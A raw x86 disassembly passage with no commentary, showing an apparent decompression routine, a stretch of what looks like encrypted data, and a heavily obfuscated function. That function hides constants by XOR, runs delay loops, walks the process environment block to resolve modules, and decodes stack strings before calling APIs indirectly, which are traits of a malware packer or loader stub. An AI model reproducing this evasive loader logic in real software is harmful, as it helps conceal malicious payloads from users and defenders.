  420101:	mov    al,0xd8
  420103:	call   0x420301
  420108:	mov    esi,DWORD PTR [ebp-0x28]
  42010b:	je     0x420128
  42010d:	mov    al,0xe4
  42010f:	call   0x420301
  420114:	mov    esi,DWORD PTR [ebp-0x2c]
  420117:	je     0x420122
  420119:	mov    esi,DWORD PTR [ebp-0x30]
  42011c:	mov    ecx,DWORD PTR [ebp-0x2c]
  42011f:	mov    DWORD PTR [ebp-0x30],ecx
  420122:	mov    ecx,DWORD PTR [ebp-0x28]
  420125:	mov    DWORD PTR [ebp-0x2c],ecx
  420128:	mov    ecx,DWORD PTR [ebp-0x24]
  42012b:	mov    DWORD PTR [ebp-0x28],ecx
  42012e:	mov    DWORD PTR [ebp-0x24],esi
  420131:	pop    eax
  420132:	pop    edi
  420133:	pop    ecx
  420134:	mov    edx,0xa68
  420139:	mov    cl,0x8
  42013b:	add    edx,edi
  42013d:	push   edx
  42013e:	push   edi
  42013f:	cmp    al,0x7
  420141:	mov    al,cl
  420143:	jb     0x420147
  420145:	add    al,0x3
  420147:	push   eax
  420148:	mov    ebp,DWORD PTR [ebp-0x34]
  42014b:	call   0x42030e
  420150:	jne    0x420166
  420152:	mov    eax,DWORD PTR [ebp-0x18]
  420155:	mov    edi,DWORD PTR [ebp-0x34]
  420158:	shl    eax,0x3
  42015b:	sub    ecx,ecx
  42015d:	push   0x8
  42015f:	pop    esi
  420160:	lea    edi,[edi+eax*2+0x4]
  420164:	jmp    0x42019b
  420166:	mov    ebp,DWORD PTR [ebp-0x34]
  420169:	add    ebp,0x2
  42016c:	call   0x42030e
  420171:	jne    0x42018b
  420173:	mov    eax,DWORD PTR [ebp-0x18]
  420176:	mov    edi,DWORD PTR [ebp-0x34]
  420179:	shl    eax,0x3
  42017c:	push   0x8
  42017e:	pop    ecx
  42017f:	push   0x8
  420181:	pop    esi
  420182:	lea    edi,[edi+eax*2+0x104]
  420189:	jmp    0x42019b
  42018b:	mov    edi,0x204
  420190:	add    edi,DWORD PTR [ebp-0x34]
  420193:	push   0x10
  420195:	pop    ecx
  420196:	mov    esi,0x100
  42019b:	mov    DWORD PTR [ebp-0x1c],ecx
  42019e:	sub    eax,eax
  4201a0:	inc    eax
  4201a1:	mov    ebp,edi
  4201a3:	call   0x420310
  4201a8:	mov    ecx,eax
  4201aa:	sub    ecx,esi
  4201ac:	jb     0x4201a1
  4201ae:	add    DWORD PTR [ebp-0x1c],ecx
  4201b1:	cmp    DWORD PTR [ebp-0x3c],0x4
  4201b5:	jae    0x42026b
  4201bb:	add    DWORD PTR [ebp-0x3c],0x7
  4201bf:	mov    ecx,DWORD PTR [ebp-0x1c]
  4201c2:	cmp    ecx,0x4
  4201c5:	jb     0x4201ca
  4201c7:	push   0x3
  4201c9:	pop    ecx
  4201ca:	mov    edi,DWORD PTR [ebp-0x38]
  4201cd:	shl    ecx,0x6
  4201d0:	sub    eax,eax
  4201d2:	inc    eax
  4201d3:	push   0x40
  4201d5:	pop    esi
  4201d6:	lea    edi,[edi+ecx*2+0x360]
  4201dd:	mov    ebp,edi
  4201df:	call   0x420310
  4201e4:	mov    ecx,eax
  4201e6:	sub    ecx,esi
  4201e8:	jb     0x4201dd
  4201ea:	mov    DWORD PTR [ebp-0x18],ecx
  4201ed:	mov    DWORD PTR [ebp-0x24],ecx
  4201f0:	cmp    ecx,0x4
  4201f3:	jb     0x420268
  4201f5:	mov    esi,ecx
  4201f7:	and    DWORD PTR [ebp-0x24],0x1
  4201fb:	shr    esi,1
  4201fd:	or     DWORD PTR [ebp-0x24],0x2
  420201:	dec    esi
  420202:	cmp    ecx,0xe
  420205:	jae    0x420220
  420207:	mov    eax,0x2af
  42020c:	sub    eax,ecx
  42020e:	mov    ecx,esi
  420210:	shl    BYTE PTR [ebp-0x24],cl
  420213:	add    eax,DWORD PTR [ebp-0x24]
  420216:	shl    eax,1
  420218:	add    eax,DWORD PTR [ebp-0x38]
  42021b:	mov    DWORD PTR [ebp-0x34],eax
  42021e:	jmp    0x42024d
  420220:	sub    esi,0x4
  420223:	call   0x4202cd
  420228:	shr    ebx,1
  42022a:	shl    DWORD PTR [ebp-0x24],1
  42022d:	cmp    DWORD PTR [ebp-0x20],ebx
  420230:	jb     0x420238
  420232:	inc    DWORD PTR [ebp-0x24]
  420235:	sub    DWORD PTR [ebp-0x20],ebx
  420238:	dec    esi
  420239:	jne    0x420223
  42023b:	mov    eax,0x644
  420240:	add    eax,DWORD PTR [ebp-0x38]
  420243:	mov    DWORD PTR [ebp-0x34],eax
  420246:	shl    DWORD PTR [ebp-0x24],0x4
  42024a:	push   0x4
  42024c:	pop    esi
  42024d:	sub    edi,edi
  42024f:	inc    edi
  420250:	mov    eax,edi
  420252:	mov    ebp,DWORD PTR [ebp-0x34]
  420255:	call   0x420310
  42025a:	test   al,0x1
  42025c:	je     0x420261
  42025e:	or     DWORD PTR [ebp-0x24],edi
  420261:	shl    edi,1
  420263:	dec    esi
  420264:	jne    0x420252
  420266:	jmp    0x420268
  420268:	inc    DWORD PTR [ebp-0x24]
  42026b:	mov    ecx,DWORD PTR [ebp-0x1c]
  42026e:	add    ecx,0x2
  420271:	mov    edi,DWORD PTR [ebp-0x4]
  420274:	mov    eax,edi
  420276:	sub    eax,DWORD PTR [ebp+0x24]
  420279:	cmp    DWORD PTR [ebp-0x24],eax
  42027c:	ja     0x4202c8
  42027e:	mov    esi,edi
  420280:	sub    esi,DWORD PTR [ebp-0x24]
  420283:	mov    edx,DWORD PTR [ebp+0x28]
  420286:	lods   al,BYTE PTR ds:[esi]
  420287:	stos   BYTE PTR es:[edi],al
  420288:	cmp    edi,edx
  42028a:	jae    0x42028f
  42028c:	dec    ecx
  42028d:	jne    0x420286
  42028f:	mov    DWORD PTR [ebp-0x4],edi
  420292:	movzx  esi,al
  420295:	cmp    edi,DWORD PTR [ebp+0x28]
  420298:	jb     0x41fff9
  42029e:	call   0x4202cd
  4202a3:	sub    eax,eax
  4202a5:	lea    ebp,[esp+0x3c]
  4202a9:	mov    edx,DWORD PTR [ebp+0x20]
  4202ac:	mov    esi,DWORD PTR [ebp-0x8]
  4202af:	sub    esi,DWORD PTR [ebp+0x18]
  4202b2:	mov    DWORD PTR [edx],esi
  4202b4:	mov    edx,DWORD PTR [ebp+0x2c]
  4202b7:	mov    edi,DWORD PTR [ebp-0x4]
  4202ba:	sub    edi,DWORD PTR [ebp+0x24]
  4202bd:	mov    DWORD PTR [edx],edi
  4202bf:	leave  
  4202c0:	pop    ebx
  4202c1:	pop    esi
  4202c2:	pop    edi
  4202c3:	ret    0x1c
  4202c6:	pop    esi
  4202c7:	pop    eax
  4202c8:	sub    eax,eax
  4202ca:	inc    eax
  4202cb:	jmp    0x4202a5
  4202cd:	cmp    ebx,0x1000000
  4202d3:	jb     0x4202d6
  4202d5:	ret    
  4202d6:	shl    ebx,0x8
  4202d9:	push   esi
  4202da:	mov    esi,DWORD PTR [ebp-0x8]
  4202dd:	cmp    esi,DWORD PTR [ebp+0x1c]
  4202e0:	jae    0x4202c6
  4202e2:	mov    ecx,0xe920ea0
  4202e7:	stos   DWORD PTR es:[edi],eax
  4202e8:	cmp    eax,0xb10ea0b1
  4202ed:	pusha  
  4202ee:	outs   dx,BYTE PTR ds:[esi]
  4202ef:	add    al,0x9a
  4202f1:	mov    ecx,0x65c79ec0
  4202f6:	mov    ss,WORD PTR [edx-0x5f6864ee]
  4202fc:	cs xchg edi,eax
  4202fe:	xchg   edx,eax
  4202ff:	cmp    ah,BYTE PTR [ebx-0x68719a39]
  420305:	mov    al,ds:0xae40b99e
  42030a:	sar    DWORD PTR [eax+eiz*4],0x8b
  42030e:	aaa    
  42030f:	mov    es,ecx
  420311:	cmp    al,0xa0
  420313:	mov    edx,DWORD PTR [ecx-0x74747486]
  420319:	(bad)  
  42031a:	pop    eax
  42031b:	sti    
  42031c:	mov    ecx,0x926b1bbc
  420321:	sbb    al,0x1b
  420323:	or     ebp,DWORD PTR [ebx-0x3e44389]
  420329:	pop    eax
  42032a:	std    
  42032b:	mov    ch,0xcf
  42032d:	mov    bl,BYTE PTR [ebx+ebx*1-0x54e56d95]
  420334:	lods   eax,DWORD PTR ds:[esi]
  420335:	fcomp  QWORD PTR [ebx]
  420337:	or     edi,DWORD PTR [ecx-0x1f963846]
  42033d:	mov    edx,DWORD PTR [edx+0x49c7b732]
  420343:	mov    dh,0x6f
  420345:	mov    esp,0xe7580b1b
  42034a:	mov    ecx,0xab8b71f2
  42034f:	mov    ecx,DWORD PTR [ebx+0x3292b637]
  420355:	lahf   
  420356:	and    al,0x8f
  420358:	ror    BYTE PTR [ebx+0x3cc18e97],0x1b
  42035f:	mov    WORD PTR [edx+0x29053692],ds
  420365:	dec    esp
  420366:	and    al,0x20
  420368:	sub    ebx,ecx
  42036a:	sub    WORD PTR [ebp+0x0],dx
  42036e:	add    eax,eax
  420370:	add    eax,0x1
  420373:	lea    ebp,[esp+0x40]
  420377:	ret    
  420378:	push   ebp
  420379:	mov    ebp,esp
  42037b:	sub    esp,0x12c
  420381:	push   ebx
  420382:	push   esi
  420383:	push   edi
  420384:	mov    DWORD PTR [ebp-0x10],0xf89c85b5
  42038b:	mov    DWORD PTR [ebp-0x18],0xf89c85b4
  420392:	mov    eax,DWORD PTR [ebp+0x8]
  420395:	mov    DWORD PTR [ebp+0x8],eax
  420398:	mov    ecx,DWORD PTR [ebp-0x10]
  42039b:	mov    ebx,0x75108b3
  4203a0:	xor    ecx,ebx
  4203a2:	mov    eax,0x3272fa
  4203a7:	add    ecx,eax
  4203a9:	mov    DWORD PTR [ebp-0x2c],ecx
  4203ac:	mov    ecx,DWORD PTR [ebp-0x10]
  4203af:	xor    ecx,ebx
  4203b1:	add    ecx,eax
  4203b3:	mov    DWORD PTR [ebp-0x3c],ecx
  4203b6:	mov    ecx,DWORD PTR [ebp-0x10]
  4203b9:	xor    ecx,ebx
  4203bb:	add    ecx,eax
  4203bd:	mov    DWORD PTR [ebp-0x40],ecx
  4203c0:	mov    ecx,DWORD PTR [ebp-0x10]
  4203c3:	xor    ecx,ebx
  4203c5:	add    ecx,eax
  4203c7:	mov    DWORD PTR [ebp-0xd8],ecx
  4203cd:	mov    DWORD PTR [ebp-0x50],0xf89f05b5
  4203d4:	mov    DWORD PTR [ebp-0x40],0xf89cb5b5
  4203db:	mov    DWORD PTR [ebp-0x54],0xf89c85b9
  4203e2:	push   0x25
  4203e4:	pop    ecx
  4203e5:	mov    DWORD PTR [ebp-0x38],ecx
  4203e8:	mov    DWORD PTR [ebp-0x38],ecx
  4203eb:	push   0x65
  4203ed:	pop    ecx
  4203ee:	mov    DWORD PTR [ebp-0x38],ecx
  4203f1:	mov    DWORD PTR [ebp-0x38],ecx
  4203f4:	mov    DWORD PTR [ebp-0x38],0x4d
  4203fb:	mov    DWORD PTR [ebp-0x38],0x43
  420402:	mov    ecx,DWORD PTR [ebp-0x10]
  420405:	xor    ecx,ebx
  420407:	add    ecx,eax
  420409:	mov    DWORD PTR [ebp-0x38],ecx
  42040c:	mov    ecx,DWORD PTR [ebp-0x10]
  42040f:	xor    ecx,ebx
  420411:	add    ecx,eax
  420413:	mov    DWORD PTR [ebp-0x38],ecx
  420416:	mov    DWORD PTR [ebp-0x28],0x258
  42041d:	mov    DWORD PTR [ebp-0x20],0x36
  420424:	mov    DWORD PTR [ebp-0x14],0x7a
  42042b:	lea    edi,[ebp-0x10c]
  420431:	lea    esi,[ebp-0x12c]
  420437:	call   0x4210f9
  42043c:	dec    DWORD PTR [ebp-0x14]
  42043f:	jne    0x42042b
  420441:	dec    DWORD PTR [ebp-0x20]
  420444:	jne    0x420424
  420446:	dec    DWORD PTR [ebp-0x28]
  420449:	jne    0x42041d
  42044b:	mov    DWORD PTR [ebp-0x28],0x400e
  420452:	mov    eax,DWORD PTR [ebp-0x10]
  420455:	xor    eax,ebx
  420457:	mov    esi,0x3272fa
  42045c:	add    eax,esi
  42045e:	mov    DWORD PTR [ebp-0x1c],eax
  420461:	mov    eax,DWORD PTR [ebp-0x10]
  420464:	and    DWORD PTR [ebp-0x94],0x0
  42046b:	xor    eax,ebx
  42046d:	add    eax,esi
  42046f:	mov    DWORD PTR [ebp-0x34],eax
  420472:	mov    eax,fs:0x18
  420478:	mov    DWORD PTR [ebp-0x94],eax
  42047e:	mov    eax,DWORD PTR [eax+0x30]
  420481:	mov    DWORD PTR [ebp-0xcc],eax
  420487:	mov    eax,DWORD PTR [eax+0xc]
  42048a:	mov    DWORD PTR [ebp-0xc0],eax
  420490:	mov    eax,DWORD PTR [ebp+0x8]
  420493:	lea    ecx,[ebp-0x94]
  420499:	mov    DWORD PTR [eax+0x1a0],ecx
  42049f:	mov    eax,DWORD PTR [ebp+0x8]
  4204a2:	lea    ecx,[ebp-0xcc]
  4204a8:	mov    DWORD PTR [eax+0x1a4],ecx
  4204ae:	mov    eax,DWORD PTR [ebp+0x8]
  4204b1:	push   DWORD PTR [ebp+0x8]
  4204b4:	lea    ecx,[ebp-0xc0]
  4204ba:	mov    DWORD PTR [eax+0x1a8],ecx
  4204c0:	call   0x4228ba
  4204c5:	mov    ecx,DWORD PTR [ebp-0x10]
  4204c8:	xor    ecx,ebx
  4204ca:	add    ecx,esi
  4204cc:	cmp    ecx,eax
  4204ce:	je     0x420851
  4204d4:	mov    eax,DWORD PTR [ebp+0x8]
  4204d7:	mov    eax,DWORD PTR [eax+0x194]
  4204dd:	mov    ecx,DWORD PTR [eax]
  4204df:	mov    eax,DWORD PTR [ebp+0x8]
  4204e2:	mov    eax,DWORD PTR [eax+0x194]
  4204e8:	mov    eax,DWORD PTR [eax]
  4204ea:	add    eax,DWORD PTR [ecx+0x3c]
  4204ed:	mov    ecx,DWORD PTR [ebp+0x8]
  4204f0:	mov    ecx,DWORD PTR [ecx+0x1e0]
  4204f6:	lea    edx,[ebp-0xec]
  4204fc:	push   edx
  4204fd:	mov    edx,DWORD PTR [ebp+0x8]
  420500:	mov    edx,DWORD PTR [edx+0x18c]
  420506:	mov    edx,DWORD PTR [edx]
  420508:	add    edx,DWORD PTR [eax+0x88]
  42050e:	push   0x4
  420510:	push   DWORD PTR [eax+0x8c]
  420516:	push   edx
  420517:	call   DWORD PTR [ecx+0x1c]
  42051a:	push   DWORD PTR [ebp+0x8]
  42051d:	xor    eax,eax
  42051f:	mov    DWORD PTR [ebp-0xa8],0xe3bcecc2
  420529:	mov    DWORD PTR [ebp-0xa4],0xe8c7edda
  420533:	mov    DWORD PTR [ebp-0xa0],0xbaeddef0
  42053d:	mov    BYTE PTR [ebp-0x9c],0x7b
  420544:	lea    edi,[ebp-0x9b]
  42054a:	stos   DWORD PTR es:[edi],eax
  42054b:	stos   WORD PTR es:[edi],ax
  42054d:	stos   BYTE PTR es:[edi],al
  42054e:	xor    eax,eax
  420550:	mov    DWORD PTR [ebp-0xbc],0xe3bcecc2
  42055a:	mov    DWORD PTR [ebp-0xb8],0xe8c7edda
  420564:	mov    DWORD PTR [ebp-0xb4],0xd0eddef0
  42056e:	mov    BYTE PTR [ebp-0xb0],0x7b
  420575:	lea    edi,[ebp-0xaf]
  42057b:	stos   DWORD PTR es:[edi],eax
  42057c:	stos   WORD PTR es:[edi],ax
  42057e:	stos   BYTE PTR es:[edi],al
  42057f:	mov    edi,DWORD PTR [ebp+0x8]
  420582:	mov    eax,DWORD PTR [ebp+0x8]
  420585:	mov    edx,DWORD PTR [eax+0x1b8]
  42058b:	mov    DWORD PTR [ebp-0x68],0xedefece7
  420592:	mov    DWORD PTR [ebp-0x64],0xe2ebe6dc
  420599:	mov    WORD PTR [ebp-0x60],0x7bba
  42059f:	mov    DWORD PTR [ebp-0x90],0xe3bcecc2
  4205a9:	mov    DWORD PTR [ebp-0x8c],0xe7baedda
  4205b3:	mov    DWORD PTR [ebp-0x88],0xc9dae3eb
  4205bd:	mov    DWORD PTR [ebp-0x84],0xeddee6ee
  4205c7:	mov    DWORD PTR [ebp-0x80],0x7bbadce2
  4205ce:	mov    DWORD PTR [ebp-0x7c],0xe3bcecc2
  4205d5:	mov    DWORD PTR [ebp-0x78],0xe7baedda
  4205dc:	mov    DWORD PTR [ebp-0x74],0xc9dae3eb
  4205e3:	mov    DWORD PTR [ebp-0x70],0xeddee6ee
  4205ea:	mov    DWORD PTR [ebp-0x6c],0x7bd0dce2
  4205f1:	call   0x4228e9
  4205f6:	push   eax
  4205f7:	mov    eax,DWORD PTR [ebp+0x8]
  4205fa:	mov    eax,DWORD PTR [eax+0x1a8]
  420600:	push   DWORD PTR [eax]
  420602:	call   0x42258a
  420607:	test   eax,eax
  420609:	jne    0x42065b
  42060b:	mov    eax,DWORD PTR [ebp+0x8]
  42060e:	mov    eax,DWORD PTR [eax+0x1e0]
  420614:	mov    edi,DWORD PTR [ebp+0x8]
  420617:	add    eax,0x4
  42061a:	mov    DWORD PTR [ebp-0x24],eax
  42061d:	mov    eax,DWORD PTR [ebp+0x8]
  420620:	mov    edx,DWORD PTR [eax+0x1b8]
  420626:	call   0x4228e9
  42062b:	push   eax
  42062c:	mov    eax,DWORD PTR [ebp-0x24]
  42062f:	call   DWORD PTR [eax]
  420631:	test   eax,eax
  420633:	jne    0x42065b
  420635:	mov    eax,DWORD PTR [ebp+0x8]
  420638:	mov    eax,DWORD PTR [eax+0x1e0]
  42063e:	mov    edi,DWORD PTR [ebp+0x8]
  420641:	add    eax,0x10
  420644:	mov    DWORD PTR [ebp-0x24],eax
  420647:	mov    eax,DWORD PTR [ebp+0x8]
  42064a:	mov    edx,DWORD PTR [eax+0x1b8]
  420650:	call   0x4228e9
  420655:	push   eax
  420656:	mov    eax,DWORD PTR [ebp-0x24]
  420659:	call   DWORD PTR [eax]
  42065b:	mov    eax,DWORD PTR [ebp-0x10]
  42065e:	mov    ecx,DWORD PTR [ebp-0x28]
  420661:	xor    eax,ebx
  420663:	add    eax,esi
  420665:	cmp    eax,ecx
  420667:	je     0x42082a
  42066d:	mov    eax,DWORD PTR [ebp-0x18]
  420670:	xor    eax,ebx
  420672:	mov    ecx,0xffcd8d06
  420677:	sub    ecx,eax
  420679:	add    ecx,DWORD PTR [ebp-0x28]
  42067c:	mov    eax,DWORD PTR [ebp-0x1c]
  42067f:	cmp    eax,ecx
  420681:	ja     0x42082a
  420687:	mov    DWORD PTR [ebp-0x20],0x0
  42068e:	push   DWORD PTR [ebp+0x8]
  420691:	mov    edi,DWORD PTR [ebp+0x8]
  420694:	mov    eax,DWORD PTR [ebp+0x8]
  420697:	mov    edx,DWORD PTR [eax+0x1b4]
  42069d:	call   0x4228e9
  4206a2:	push   eax
  4206a3:	mov    eax,DWORD PTR [ebp+0x8]
  4206a6:	mov    eax,DWORD PTR [eax+0x1a8]
  4206ac:	push   DWORD PTR [eax]
  4206ae:	call   0x42258a
  4206b3:	mov    ecx,DWORD PTR [ebp+0x8]
  4206b6:	mov    ecx,DWORD PTR [ecx+0x19c]
  4206bc:	mov    DWORD PTR [ecx],eax
  4206be:	mov    eax,DWORD PTR [ebp+0x8]
  4206c1:	mov    edi,DWORD PTR [eax+0x1e0]
  4206c7:	mov    esi,DWORD PTR [ebp+0x8]
  4206ca:	xor    eax,eax
  4206cc:	lea    edx,[ebp-0x7c]
  4206cf:	call   0x42291f
  4206d4:	push   eax
  4206d5:	mov    eax,DWORD PTR [ebp+0x8]
  4206d8:	mov    eax,DWORD PTR [eax+0x19c]
  4206de:	push   DWORD PTR [eax]
  4206e0:	call   DWORD PTR [edi+0x8]
  4206e3:	mov    DWORD PTR [ebp-0x24],eax
  4206e6:	mov    eax,DWORD PTR [ebp+0x8]
  4206e9:	mov    edi,DWORD PTR [eax+0x1e0]
  4206ef:	mov    esi,DWORD PTR [ebp+0x8]
  4206f2:	xor    eax,eax
  4206f4:	lea    edx,[ebp-0x90]
  4206fa:	call   0x42291f
  4206ff:	push   eax
  420700:	mov    eax,DWORD PTR [ebp+0x8]
  420703:	mov    eax,DWORD PTR [eax+0x19c]
  420709:	push   DWORD PTR [eax]
  42070b:	call   DWORD PTR [edi+0x8]
  42070e:	mov    eax,DWORD PTR [ebp+0x8]
  420711:	mov    edi,DWORD PTR [eax+0x1e0]
  420717:	mov    esi,DWORD PTR [ebp+0x8]
  42071a:	xor    eax,eax
  42071c:	lea    edx,[ebp-0xa8]
  420722:	call   0x42291f
  420727:	push   eax
  420728:	mov    eax,DWORD PTR [ebp+0x8]
  42072b:	mov    eax,DWORD PTR [eax+0x19c]
  420731:	push   DWORD PTR [eax]
  420733:	call   DWORD PTR [edi+0x8]
  420736:	and    DWORD PTR [ebp-0x8],0x0
  42073a:	mov    DWORD PTR [ebp-0x44],eax
  42073d:	mov    eax,DWORD PTR [ebp-0x8]
  420740:	and    eax,0x7
  420743:	add    eax,0x31
  420746:	push   eax
  420747:	call   DWORD PTR [ebp-0x24]
  42074a:	test   eax,eax
  42074c:	je     0x420790
  42074e:	mov    eax,DWORD PTR [ebp-0x8]
  420751:	push   0x19
  420753:	xor    edx,edx
  420755:	pop    ecx
  420756:	div    ecx
  420758:	add    dl,0x41
  42075b:	movzx  eax,dl
  42075e:	push   eax
  42075f:	call   DWORD PTR [ebp-0x44]
  420762:	test   eax,eax
  420764:	jne    0x420790
  420766:	mov    eax,DWORD PTR [ebp+0x8]
  420769:	mov    edi,DWORD PTR [eax+0x1e0]
  42076f:	mov    esi,DWORD PTR [ebp+0x8]
  420772:	xor    eax,eax
  420774:	lea    edx,[ebp-0x68]
  420777:	call   0x42291f
  42077c:	push   eax
  42077d:	mov    eax,DWORD PTR [ebp+0x8]
  420780:	mov    eax,DWORD PTR [eax+0x198]
  420786:	push   DWORD PTR [eax]
  420788:	call   DWORD PTR [edi+0x8]
  42078b:	mov    DWORD PTR [ebp-0x14],eax
  42078e:	jmp    0x420794
  420790:	and    DWORD PTR [ebp-0x14],0x0
  420794:	inc    DWORD PTR [ebp-0x8]
  420797:	cmp    DWORD PTR [ebp-0x8],0x10
  42079b:	jb     0x42073d
  42079d:	mov    eax,DWORD PTR [ebp-0x18]
  4207a0:	mov    esi,DWORD PTR [ebp+0x8]
  4207a3:	xor    eax,ebx
  4207a5:	mov    edi,0x3272fa
  4207aa:	add    eax,edi
  4207ac:	lea    edx,[ebp-0x10c]
  4207b2:	call   0x42291f
  4207b7:	push   eax
  4207b8:	mov    eax,DWORD PTR [ebp-0x10]
  4207bb:	mov    esi,DWORD PTR [ebp+0x8]
  4207be:	xor    eax,ebx
  4207c0:	add    eax,edi
  4207c2:	lea    edx,[ebp-0x12c]
  4207c8:	call   0x42291f
  4207cd:	push   eax
  4207ce:	call   DWORD PTR [ebp-0x14]
  4207d1:	mov    ecx,DWORD PTR [ebp-0x10]
  4207d4:	xor    ecx,ebx
  4207d6:	add    ecx,edi
  4207d8:	cmp    ecx,eax
  4207da:	jne    0x4207e3
  4207dc:	mov    DWORD PTR [ebp-0x20],0x1
  4207e3:	mov    eax,DWORD PTR [ebp-0x18]
  4207e6:	mov    ecx,DWORD PTR [ebp-0x1c]
  4207e9:	xor    eax,ebx
  4207eb:	lea    eax,[eax+ecx*1+0x3272fa]
  4207f2:	mov    DWORD PTR [ebp-0x1c],eax
  4207f5:	mov    eax,DWORD PTR [ebp-0x20]
  4207f8:	test   eax,eax
  4207fa:	je     0x42080e
  4207fc:	mov    eax,DWORD PTR [ebp-0x18]
  4207ff:	mov    ecx,DWORD PTR [ebp-0x34]
  420802:	xor    eax,ebx
  420804:	lea    eax,[eax+ecx*1+0x3272fa]
  42080b:	mov    DWORD PTR [ebp-0x34],eax
  42080e:	mov    eax,DWORD PTR [ebp-0x18]
  420811:	xor    eax,ebx
  420813:	mov    ecx,0xffcd8d06
  420818:	sub    ecx,eax
  42081a:	add    ecx,DWORD PTR [ebp-0x28]
  42081d:	mov    eax,DWORD PTR [ebp-0x1c]
  420820:	cmp    eax,ecx
  420822:	jbe    0x420687
  420828:	mov    esi,edi
  42082a:	mov    eax,DWORD PTR [ebp-0x34]
  42082d:	mov    ecx,DWORD PTR [ebp-0x1c]
  420830:	cmp    ecx,eax
  420832:	jne    0x420845
  420834:	push   DWORD PTR [ebp+0x8]
  420837:	lea    eax,[ebp-0x3c]
  42083a:	push   eax
  42083b:	call   0x42338e
  420840:	mov    DWORD PTR [ebp-0x2c],eax
  420843:	jmp    0x420851
  420845:	mov    eax,DWORD PTR [ebp-0x2c]
  420848:	mov    ecx,DWORD PTR [ebp-0x18]
  42084b:	xor    ecx,ebx
  42084d:	add    ecx,esi
  42084f:	xor    DWORD PTR [eax],ecx
  420851:	mov    eax,DWORD PTR [ebp-0x10]
  420854:	mov    ecx,DWORD PTR [ebp-0x2c]
  420857:	xor    eax,ebx
  420859:	add    eax,esi
  42085b:	cmp    eax,ecx
  42085d:	je     0x420fd7
  420863:	mov    eax,DWORD PTR [ebp-0x10]
  420866:	mov    ecx,DWORD PTR [ebp-0x3c]
  420869:	xor    eax,ebx
  42086b:	add    eax,esi
  42086d:	cmp    eax,ecx
  42086f:	je     0x420fd7
  420875:	mov    eax,DWORD PTR [ebp-0x10]
  420878:	xor    eax,ebx
  42087a:	add    eax,esi
  42087c:	jmp    0x42089a
  42087e:	mov    edi,DWORD PTR [ebp-0x2c]
  420881:	mov    cl,al
  420883:	and    cl,0x1f
  420886:	or     dl,0xff
  420889:	sub    dl,cl
  42088b:	add    BYTE PTR [edi+eax*1],dl
  42088e:	mov    ecx,DWORD PTR [ebp-0x18]
  420891:	xor    ecx,ebx
  420893:	lea    eax,[eax+ecx*1+0x3272fa]
  42089a:	mov    ecx,DWORD PTR [ebp-0x3c]
  42089d:	cmp    eax,ecx
  42089f:	jb     0x42087e
  4208a1:	mov    eax,DWORD PTR [ebp-0x3c]
  4208a4:	mov    DWORD PTR [ebp-0x28],eax
  4208a7:	mov    eax,DWORD PTR [ebp-0x2c]
  4208aa:	mov    DWORD PTR [ebp-0x34],0xf89c85b5
  4208b1:	mov    DWORD PTR [ebp-0xd4],eax
  4208b7:	mov    edi,0xf89c85b4
  4208bc:	mov    DWORD PTR [ebp-0x30],edi
  4208bf:	mov    eax,DWORD PTR [ebp-0x34]
  4208c2:	xor    eax,ebx
  4208c4:	add    eax,esi
  4208c6:	mov    DWORD PTR [ebp-0xc],eax
  4208c9:	mov    eax,DWORD PTR [ebp-0x34]
  4208cc:	xor    eax,ebx
  4208ce:	add    eax,esi
  4208d0:	mov    DWORD PTR [ebp-0x8],eax
  4208d3:	mov    DWORD PTR [ebp-0x44],0xf89c8595
  4208da:	mov    DWORD PTR [ebp-0x4c],0xf89c85be
  4208e1:	mov    eax,DWORD PTR [ebp-0x34]
  4208e4:	mov    ecx,DWORD PTR [ebp-0x28]
  4208e7:	xor    eax,ebx
  4208e9:	add    eax,esi
  4208eb:	cmp    ecx,eax
  4208ed:	je     0x420aec
  4208f3:	jmp    0x420ac8
  4208f8:	mov    ecx,DWORD PTR [ebp-0xc]
  4208fb:	mov    eax,DWORD PTR [ebp-0x28]
  4208fe:	sub    eax,ecx
  420900:	mov    ecx,DWORD PTR [ebp-0x44]
  420903:	xor    ecx,ebx
  420905:	add    ecx,esi
  420907:	xor    edx,edx
  420909:	div    ecx
  42090b:	mov    DWORD PTR [ebp-0x8],eax
  42090e:	mov    eax,DWORD PTR [ebp-0x4c]
  420911:	mov    ecx,DWORD PTR [ebp-0x8]
  420914:	xor    eax,ebx
  420916:	add    eax,esi
  420918:	cmp    ecx,eax
  42091a:	jbe    0x420926
  42091c:	mov    eax,DWORD PTR [ebp-0x4c]
  42091f:	xor    eax,ebx
  420921:	add    eax,esi
  420923:	mov    DWORD PTR [ebp-0x8],eax
  420926:	mov    eax,DWORD PTR [ebp-0x44]
  420929:	mov    ecx,DWORD PTR [ebp-0x8]
  42092c:	xor    eax,ebx
  42092e:	add    eax,esi
  420930:	imul   eax,ecx
  420933:	mov    DWORD PTR [ebp-0x8],eax
  420936:	mov    eax,DWORD PTR [ebp-0x34]
  420939:	mov    ecx,DWORD PTR [ebp-0x8]
  42093c:	xor    eax,ebx
  42093e:	add    eax,esi
  420940:	cmp    ecx,eax
  420942:	je     0x420ab6
  420948:	mov    eax,DWORD PTR [ebp-0x8]
  42094b:	mov    DWORD PTR [ebp-0x14],eax
  42094e:	mov    eax,DWORD PTR [ebp-0xc]
  420951:	add    eax,DWORD PTR [ebp-0xd4]
  420957:	mov    DWORD PTR [ebp-0x24],0xf89c85b5
  42095e:	mov    DWORD PTR [ebp-0x20],edi
  420961:	mov    DWORD PTR [ebp-0xe8],0xf89c85bb
  42096b:	mov    DWORD PTR [ebp-0x8],eax
  42096e:	mov    DWORD PTR [ebp-0x38],0xf89c85ba
  420975:	mov    DWORD PTR [ebp-0x1c],edi
  420978:	mov    eax,DWORD PTR [ebp-0x24]
  42097b:	xor    eax,ebx
  42097d:	add    eax,esi
  42097f:	jmp    0x420a75
  420984:	mov    DWORD PTR [ebp-0xe0],0xf89c85a2
  42098e:	mov    DWORD PTR [ebp-0xc4],0xf89c85af
  420998:	mov    eax,DWORD PTR [ebp-0x1c]
  42099b:	mov    ecx,DWORD PTR [ebp-0x48]
  42099e:	xor    eax,ebx
  4209a0:	add    eax,esi
  4209a2:	imul   eax,ecx
  4209a5:	mov    ecx,DWORD PTR [ebp-0x8]
  4209a8:	mov    al,BYTE PTR [eax+ecx*1]
  4209ab:	mov    BYTE PTR [ebp-0x2],al
  4209ae:	mov    eax,DWORD PTR [ebp-0x1c]
  4209b1:	mov    ecx,DWORD PTR [ebp-0x48]
  4209b4:	xor    eax,ebx
  4209b6:	add    eax,esi
  4209b8:	imul   eax,ecx
  4209bb:	mov    ecx,DWORD PTR [ebp-0xe8]
  4209c1:	xor    ecx,ebx
  4209c3:	add    eax,ecx
